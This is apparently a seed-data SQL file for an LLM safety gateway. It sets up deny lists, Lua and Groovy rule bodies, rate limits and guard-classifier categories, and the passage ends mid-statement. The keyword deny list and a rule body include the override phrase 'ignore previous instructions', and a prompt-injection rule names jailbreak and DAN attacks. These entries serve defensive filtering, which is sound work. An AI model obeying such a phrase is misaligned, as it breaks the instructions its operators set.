-- Minimal seed data (PostgreSQL / MySQL / SQLite compatible)
-- Idempotent: INSERT ... SELECT ... WHERE NOT EXISTS (no INSERT OR IGNORE / ON CONFLICT dependency)

INSERT INTO tb_tenants (tenant_id, name)
SELECT 'default', 'Default Tenant' FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_tenants WHERE tenant_id = 'default');

INSERT INTO tb_bundles (tenant_id, bundle_id, version, status, metadata_json)
SELECT 'default', 'demo-default', '0.1.0', 'draft',
    '{"scope":{"tenants":["default"],"apps":["demo-app"]},"gateway":{"evaluate":true,"fail_mode":"open","cloud_scan":{"agent_url":"http://127.0.0.1:9070","timeout_ms":3000},"routes":[{"uri":"/v1/chat/completions","methods":["POST"]}]}}'
FROM (SELECT 1) AS _one
WHERE NOT EXISTS (
    SELECT 1 FROM tb_bundles WHERE tenant_id = 'default' AND bundle_id = 'demo-default' AND version = '0.1.0'
);

UPDATE tb_bundles
SET metadata_json = '{"scope":{"tenants":["default"],"apps":["demo-app"]},"gateway":{"evaluate":true,"fail_mode":"open","cloud_scan":{"agent_url":"http://127.0.0.1:9070","timeout_ms":3000},"routes":[{"uri":"/v1/chat/completions","methods":["POST"]}]}}'
WHERE tenant_id = 'default' AND bundle_id = 'demo-default' AND version = '0.1.0';

-- Named access lists (ListStore -> gateway memory_lists / engine PolicyDataCache)
INSERT INTO tb_access_list_meta (tenant_id, list_name, dimension, remark)
SELECT 'default', 'deny_keyword', 'keyword', 'Demo content deny keywords' FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_access_list_meta WHERE tenant_id = 'default' AND list_name = 'deny_keyword');
INSERT INTO tb_access_list_meta (tenant_id, list_name, dimension, remark)
SELECT 'default', 'deny_user_id', 'user_id', 'Demo banned users' FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_access_list_meta WHERE tenant_id = 'default' AND list_name = 'deny_user_id');
INSERT INTO tb_access_list_meta (tenant_id, list_name, dimension, remark)
SELECT 'default', 'deny_device_id', 'device_id', 'Demo blocked devices' FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_access_list_meta WHERE tenant_id = 'default' AND list_name = 'deny_device_id');
INSERT INTO tb_access_list_meta (tenant_id, list_name, dimension, remark)
SELECT 'default', 'deny_var', 'var:app_id', 'Demo deny app_id values' FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_access_list_meta WHERE tenant_id = 'default' AND list_name = 'deny_var');

INSERT INTO tb_access_list_entry (tenant_id, list_name, value)
SELECT 'default', 'deny_keyword', 'demo-deny-keyword-1' FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_access_list_entry WHERE tenant_id = 'default' AND list_name = 'deny_keyword' AND value = 'demo-deny-keyword-1');
INSERT INTO tb_access_list_entry (tenant_id, list_name, value)
SELECT 'default', 'deny_keyword', 'demo-deny-keyword-2' FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_access_list_entry WHERE tenant_id = 'default' AND list_name = 'deny_keyword' AND value = 'demo-deny-keyword-2');
INSERT INTO tb_access_list_entry (tenant_id, list_name, value)
SELECT 'default', 'deny_keyword', 'jailbreak' FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_access_list_entry WHERE tenant_id = 'default' AND list_name = 'deny_keyword' AND value = 'jailbreak');
INSERT INTO tb_access_list_entry (tenant_id, list_name, value)
SELECT 'default', 'deny_keyword', 'ignore previous instructions' FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_access_list_entry WHERE tenant_id = 'default' AND list_name = 'deny_keyword' AND value = 'ignore previous instructions');
INSERT INTO tb_access_list_entry (tenant_id, list_name, value)
SELECT 'default', 'deny_user_id', 'u-demo-banned' FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_access_list_entry WHERE tenant_id = 'default' AND list_name = 'deny_user_id' AND value = 'u-demo-banned');
INSERT INTO tb_access_list_entry (tenant_id, list_name, value)
SELECT 'default', 'deny_device_id', 'dev-demo-blocked' FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_access_list_entry WHERE tenant_id = 'default' AND list_name = 'deny_device_id' AND value = 'dev-demo-blocked');
INSERT INTO tb_access_list_entry (tenant_id, list_name, value)
SELECT 'default', 'deny_var', 'evil' FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_access_list_entry WHERE tenant_id = 'default' AND list_name = 'deny_var' AND value = 'evil');

INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at
)
SELECT 'default', 'edge_l0_content_deny', 1, 'demo-default', 'edge', 'lua-dsl',
    'EDGE_CONTENT_KEYWORD_DENY', 100, 'deny', '{}',
    '{"keywords":["demo-deny-keyword-1","demo-deny-keyword-2","jailbreak","ignore previous instructions"],"list_type":"deny"}',
    'dry_run', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'edge_l0_content_deny' AND rule_revision = 1);

INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at
)
SELECT 'default', 'edge_l0_content_allow', 1, 'demo-default', 'edge', 'lua-dsl',
    'EDGE_CONTENT_KEYWORD_ALLOW', 0, 'allow', '{}',
    '{"keywords":[],"list_type":"allow"}',
    'dry_run', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'edge_l0_content_allow' AND rule_revision = 1);

-- rule_history (revision=1)
INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at
)
SELECT 'default', 'cloud_prompt_l1', 1, 'demo-default', 'cloud', 'prompt',
    'PROMPT_INJECTION', 100, 'deny', '{"bind_scope":"global"}',
    '"Block jailbreak, DAN, ignore-previous-instructions and other prompt injection attacks."',
    'dry_run', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'cloud_prompt_l1' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'edge_l0_content_deny', 1, 'demo-default', 'edge', 'lua-dsl', 'EDGE_CONTENT_KEYWORD_DENY', 'dry_run', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'edge_l0_content_deny');
INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'edge_l0_content_allow', 1, 'demo-default', 'edge', 'lua-dsl', 'EDGE_CONTENT_KEYWORD_ALLOW', 'dry_run', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'edge_l0_content_allow');
INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'cloud_prompt_l1', 1, 'demo-default', 'cloud', 'prompt', 'PROMPT_INJECTION', 'dry_run', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'cloud_prompt_l1');

-- Script rules (lua gateway / groovy cloud); replaces list_match / cumulative
INSERT INTO tb_cumulative (
    tenant_id, cumulative_name, description, dimension, window_kind, window_minutes, window_hours,
    timezone, priority, status)
SELECT 'default', 'user_req_1h', 'Demo user hourly limit', 'user_id', 'rolling', 60, NULL,
    NULL, 10, 'active' FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_cumulative WHERE tenant_id = 'default' AND cumulative_name = 'user_req_1h');

INSERT INTO tb_cumulative (
    tenant_id, cumulative_name, description, dimension, window_kind, window_minutes, window_hours,
    timezone, priority, status)
SELECT 'default', 'app_req_1h', 'Demo app hourly limit (var:app_id)', 'var:app_id', 'rolling', 60, NULL,
    NULL, 11, 'active' FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_cumulative WHERE tenant_id = 'default' AND cumulative_name = 'app_req_1h');

INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at)
SELECT 'default', 'rl_deny_keywords', 1, 'demo-default', 'gateway', 'lua',
    'GW_CONTENT_KEYWORD_DENY', 100, 'deny', '{}',
    '-- virbius:generated v1
function decide(ctx)
  return listMatch(''deny_keyword'', ctx.content)
end',
    'dry_run', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'rl_deny_keywords');

INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at)
SELECT 'default', 'rl_deny_users', 1, 'demo-default', 'gateway', 'lua',
    'GW_SUBJECT_USER_DENY', 100, 'deny', '{}',
    '-- virbius:generated v1
function decide(ctx)
  return listMatch(''deny_user_id'', ctx.user_id)
end',
    'dry_run', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'rl_deny_users');

INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at)
SELECT 'default', 'rl_deny_devices', 1, 'demo-default', 'gateway', 'lua',
    'GW_SUBJECT_DEVICE_DENY', 100, 'deny', '{}',
    '-- virbius:generated v1
function decide(ctx)
  return listMatch(''deny_device_id'', ctx.device_id)
end',
    'dry_run', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'rl_deny_devices');

INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at)
SELECT 'default', 'rl_rate_user_1h', 1, 'demo-default', 'gateway', 'lua',
    'GW_USER_RATE_1H', 80, 'challenge', '{"bind_scope":"global"}',
    '-- virbius:generated v1
function decide(ctx)
  return getCumulative(''user_req_1h'') >= 120
end',
    'dry_run', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'rl_rate_user_1h');

INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at)
SELECT 'default', 'rl_rate_app_1h', 1, 'demo-default', 'gateway', 'lua',
    'GW_APP_RATE_1H', 85, 'challenge', '{"bind_scope":"global"}',
    '-- virbius:generated v1
function decide(ctx)
  return getCumulative(''app_req_1h'') >= 500
end',
    'dry_run', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'rl_rate_app_1h');

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'rl_deny_keywords', 1, 'demo-default', 'gateway', 'lua', 'GW_CONTENT_KEYWORD_DENY', 'dry_run', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'rl_deny_keywords');
INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'rl_deny_users', 1, 'demo-default', 'gateway', 'lua', 'GW_SUBJECT_USER_DENY', 'dry_run', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'rl_deny_users');
INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'rl_deny_devices', 1, 'demo-default', 'gateway', 'lua', 'GW_SUBJECT_DEVICE_DENY', 'dry_run', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'rl_deny_devices');
INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'rl_rate_user_1h', 1, 'demo-default', 'gateway', 'lua', 'GW_USER_RATE_1H', 'dry_run', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'rl_rate_user_1h');
INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'rl_rate_app_1h', 1, 'demo-default', 'gateway', 'lua', 'GW_APP_RATE_1H', 'dry_run', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'rl_rate_app_1h');

-- Cloud groovy script rules (replaces list_match)
INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at)
SELECT 'default', 'cloud_rl_deny_keywords', 1, 'demo-default', 'cloud', 'groovy',
    'CLOUD_KEYWORD_DENY', 100, 'deny', '{}',
    'def decide(ctx) { return ctx.listMatch(''deny_keyword'') }',
    'dry_run', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'cloud_rl_deny_keywords' AND rule_revision = 1);

INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at)
SELECT 'default', 'cloud_rl_deny_vars', 1, 'demo-default', 'cloud', 'groovy',
    'CLOUD_VAR_DENY', 100, 'deny', '{}',
    'def decide(ctx) { return ctx.listMatch(''deny_var'', ctx.var(''app_id'')) }',
    'dry_run', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'cloud_rl_deny_vars' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'cloud_rl_deny_keywords', 1, 'demo-default', 'cloud', 'groovy', 'CLOUD_KEYWORD_DENY', 'dry_run', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'cloud_rl_deny_keywords');
INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'cloud_rl_deny_vars', 1, 'demo-default', 'cloud', 'groovy', 'CLOUD_VAR_DENY', 'dry_run', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'cloud_rl_deny_vars');

-- Migrate legacy list_match / cumulative rows on existing DBs
UPDATE tb_rule_history SET runtime = 'lua', body_json = '-- virbius:generated v1
function decide(ctx)
  return listMatch(''deny_keyword'', ctx.content)
end'
  WHERE tenant_id = 'default' AND rule_id = 'rl_deny_keywords' AND runtime = 'list_match';
UPDATE tb_rule_history SET runtime = 'lua', body_json = '-- virbius:generated v1
function decide(ctx)
  return listMatch(''deny_user_id'', ctx.user_id)
end'
  WHERE tenant_id = 'default' AND rule_id = 'rl_deny_users' AND runtime = 'list_match';
UPDATE tb_rule_history SET runtime = 'lua', body_json = '-- virbius:generated v1
function decide(ctx)
  return getCumulative(''user_req_1h'') >= 120
end'
  WHERE tenant_id = 'default' AND rule_id = 'rl_rate_user_1h' AND runtime = 'cumulative';
UPDATE tb_rule_history SET runtime = 'lua', body_json = '-- virbius:generated v1
function decide(ctx)
  return getCumulative(''app_req_1h'') >= 500
end'
  WHERE tenant_id = 'default' AND rule_id = 'rl_rate_app_1h' AND runtime = 'cumulative';
UPDATE tb_rule_history SET runtime = 'groovy', body_json = 'def decide(ctx) { return ctx.listMatch(''deny_keyword'') }'
  WHERE tenant_id = 'default' AND rule_id = 'cloud_rl_deny_keywords' AND runtime = 'list_match';
UPDATE tb_rule_history SET runtime = 'groovy', body_json = 'def decide(ctx) { return ctx.listMatch(''deny_var'', ctx.var(''app_id'')) }'
  WHERE tenant_id = 'default' AND rule_id = 'cloud_rl_deny_vars' AND runtime = 'list_match';
UPDATE tb_rules_current SET runtime = 'lua' WHERE tenant_id = 'default' AND rule_id IN ('rl_deny_keywords','rl_deny_users','rl_rate_user_1h','rl_rate_app_1h') AND runtime IN ('list_match','cumulative');
UPDATE tb_rules_current SET runtime = 'groovy' WHERE tenant_id = 'default' AND rule_id IN ('cloud_rl_deny_keywords','cloud_rl_deny_vars') AND runtime = 'list_match';

UPDATE tb_rule_history SET body_json = '-- virbius:generated v1
function decide(ctx)
  return listMatch(''deny_keyword'', ctx.content)
end', modified_at = CURRENT_TIMESTAMP
  WHERE tenant_id = 'default' AND rule_id = 'rl_deny_keywords';
UPDATE tb_rule_history SET body_json = '-- virbius:generated v1
function decide(ctx)
  return listMatch(''deny_user_id'', ctx.user_id)
end', modified_at = CURRENT_TIMESTAMP
  WHERE tenant_id = 'default' AND rule_id = 'rl_deny_users';
UPDATE tb_rule_history SET body_json = '-- virbius:generated v1
function decide(ctx)
  return getCumulative(''user_req_1h'') >= 120
end', modified_at = CURRENT_TIMESTAMP
  WHERE tenant_id = 'default' AND rule_id = 'rl_rate_user_1h';
UPDATE tb_rule_history SET body_json = '-- virbius:generated v1
function decide(ctx)
  return getCumulative(''app_req_1h'') >= 500
end', modified_at = CURRENT_TIMESTAMP
  WHERE tenant_id = 'default' AND rule_id = 'rl_rate_app_1h';

UPDATE tb_rule_history SET body_json = '-- virbius:generated v1
function decide(ctx)
  return listMatch(''deny_device_id'', ctx.device_id)
end', modified_at = CURRENT_TIMESTAMP
  WHERE tenant_id = 'default' AND rule_id = 'rl_deny_devices';

INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at)
SELECT 'default', 'rl_deny_devices', 1, 'demo-default', 'gateway', 'lua',
    'GW_SUBJECT_DEVICE_DENY', 100, 'deny', '{}',
    '-- virbius:generated v1
function decide(ctx)
  return listMatch(''deny_device_id'', ctx.device_id)
end',
    'dry_run', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'rl_deny_devices');
INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'rl_deny_devices', 1, 'demo-default', 'gateway', 'lua', 'GW_SUBJECT_DEVICE_DENY', 'dry_run', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'rl_deny_devices');

INSERT INTO tb_tenant_rollout_policy (
    tenant_id, auto_mode, canary_ladder_json, min_dry_run_hours, min_review_count,
    max_review_rate, max_review_spike_ratio, min_hours_per_step,
    min_block_samples_per_step, allow_force, rollback_block_spike_ratio,
    edge_audit_sample_rate_allow, max_concurrent_rollouts
)
SELECT 'default', 'assisted', '[5,20,50,100]', 1, 100, 0.05, 2.0, 12, 10, 1, 3.0, 0.1, 20
FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_tenant_rollout_policy WHERE tenant_id = 'default');

UPDATE tb_rules_current SET rollout_state = 'disabled', updated_at = CURRENT_TIMESTAMP
WHERE runtime = 'native';
UPDATE tb_rule_history SET rollout_state = 'disabled', modified_at = CURRENT_TIMESTAMP
WHERE runtime = 'native' AND effective_to IS NULL;

-- ============================================================
-- Qwen3Guard safety classification rules
-- Corresponds to category-rule-mapping in application.yml
-- ============================================================

INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at
)
SELECT 'default', 'prompt-violent', 1, 'demo-default', 'cloud', 'prompt',
    'VIOLENT', 100, 'deny', '{"bind_scope":"global"}',
    '"Violence, harm, terrorism and other extreme behavior."',
    'full', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'prompt-violent' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'prompt-violent', 1, 'demo-default', 'cloud', 'prompt', 'VIOLENT', 'full', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'prompt-violent');

INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at
)
SELECT 'default', 'prompt-illegal', 1, 'demo-default', 'cloud', 'prompt',
    'ILLEGAL', 100, 'deny', '{"bind_scope":"global"}',
    '"Drug manufacturing, fraud, illegal intrusion and other non-violent illegal activities."',
    'full', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'prompt-illegal' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'prompt-illegal', 1, 'demo-default', 'cloud', 'prompt', 'ILLEGAL', 'full', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'prompt-illegal');

INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at
)
SELECT 'default', 'prompt-sexual', 1, 'demo-default', 'cloud', 'prompt',
    'SEXUAL', 100, 'deny', '{"bind_scope":"global"}',
    '"Pornography, obscenity, and other inappropriate sexual content."',
    'full', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'prompt-sexual' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'prompt-sexual', 1, 'demo-default', 'cloud', 'prompt', 'SEXUAL', 'full', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'prompt-sexual');

INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at
)
SELECT 'default', 'prompt-pii', 1, 'demo-default', 'cloud', 'prompt',
    'PII', 100, 'deny', '{"bind_scope":"global"}',
    '"ID numbers, phone numbers, bank card numbers and other personal sensitive information leakage."',
    'full', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'prompt-pii' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'prompt-pii', 1, 'demo-default', 'cloud', 'prompt', 'PII', 'full', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'prompt-pii');

INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at
)
SELECT 'default', 'prompt-self-harm', 1, 'demo-default', 'cloud', 'prompt',
    'SELF_HARM', 100, 'deny', '{"bind_scope":"global"}',
    '"Suicide, self-harm, self-injury and other behaviors endangering personal safety."',
    'full', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'prompt-self-harm' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'prompt-self-harm', 1, 'demo-default', 'cloud', 'prompt', 'SELF_HARM', 'full', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'prompt-self-harm');

INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at
)
SELECT 'default', 'prompt-unethical', 1, 'demo-default', 'cloud', 'prompt',
    'UNETHICAL', 80, 'deny', '{"bind_scope":"global"}',
    '"Cheating, plagiarism, discrimination, and other unethical behavior."',
    'full', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'prompt-unethical' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'prompt-unethical', 1, 'demo-default', 'cloud', 'prompt', 'UNETHICAL', 'full', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'prompt-unethical');

INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at
)
SELECT 'default', 'prompt-political', 1, 'demo-default', 'cloud', 'prompt',
    'POLITICAL', 80, 'deny', '{"bind_scope":"global"}',
    '"Territorial sovereignty, ethnic religion, historical events and other politically sensitive topics."',
    'full', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'prompt-political' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'prompt-political', 1, 'demo-default', 'cloud', 'prompt', 'POLITICAL', 'full', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'prompt-political');

INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at
)
